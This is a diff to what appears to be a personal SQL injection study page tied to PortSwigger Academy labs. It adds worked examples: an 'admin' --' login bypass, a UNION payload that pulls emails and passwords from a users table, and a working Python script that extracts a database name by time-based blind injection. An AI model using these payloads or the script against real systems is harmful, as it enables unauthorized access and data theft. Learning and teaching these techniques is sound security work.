@@ -141,6 +141,74 @@
       <li>Burp Suite's Repeater tab can help test parameter behavior manually.</li>
     </ul>
   </div>
+  <h2>🧪 Practical Examples</h2>
+  <h3>1. Injection in WHERE Clause (Login Bypass)</h3>
+  <p>This is a classic example used in login forms where user input isn't sanitized:</p>
+  <pre><code>
+-- Application query --
+SELECT * FROM users WHERE username = 'input' AND password = 'input';
+  </code></pre>
+  <p><strong>Malicious Input:</strong></p>
+  <ul>
+    <li>Username: <code>admin' --</code></li>
+    <li>Password: <em>anything</em></li>
+  </ul>
+  <pre><code>
+-- Resulting query --
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
+  </code></pre>
+  <p>This logs the attacker in as admin, bypassing password verification.</p>
+
+  <h3>2. UNION-Based SQL Injection</h3>
+  <p>Used when the application returns visible results. The attacker injects a second query to fetch data from another table.</p>
+  <pre><code>
+-- Original query --
+SELECT name, description FROM products WHERE id = 1;
+  </code></pre>
+  <pre><code>
+-- Malicious payload --
+1 UNION SELECT email, password FROM users--
+  </code></pre>
+  <pre><code>
+-- Resulting query --
+SELECT name, description FROM products WHERE id = 1
+UNION SELECT email, password FROM users;
+  </code></pre>
+  <p>This could expose sensitive user data directly in the UI.</p>
+
+  <h3>3. Time-Based Blind SQLi (Python Script Example)</h3>
+  <p>When no output or error is shown, timing is used to infer data. Here's a Python script that extracts the database name one character at a time:</p>
+  <pre><code class="language-python">import requests
+import time
+import string
+
+url = "https://vulnerable.site/product?id="  # Update this
+delay = 3
+db_name = ""
+
+# Step 1: Find DB name length
+for length in range(1, 20):
+    payload = f"1' AND IF(LENGTH(DATABASE())={length},SLEEP({delay}),0)-- "
+    t1 = time.time()
+    requests.get(url + payload)
+    if time.time() - t1 > delay:
+        print(f"[+] DB name length: {length}")
+        break
+
+# Step 2: Extract name character by character
+for pos in range(1, length + 1):
+    for char in string.ascii_letters + string.digits + "_":
+        payload = f"1' AND IF(SUBSTR(DATABASE(),{pos},1)='{char}',SLEEP({delay}),0)-- "
+        t1 = time.time()
+        requests.get(url + payload)
+        if time.time() - t1 > delay:
+            db_name += char
+            print(f"[+] Found char {pos}: {char}")
+            break
+
+print(f"[+] Database name: {db_name}")
+  </code></pre>
+  <p>This demonstrates a fully blind SQLi where no error or response body can be used.</p>
 
   <h2>🧪 My Lab Progress</h2>
   <p>I completed 16/18 SQLi labs on PortSwigger Academy.</p>
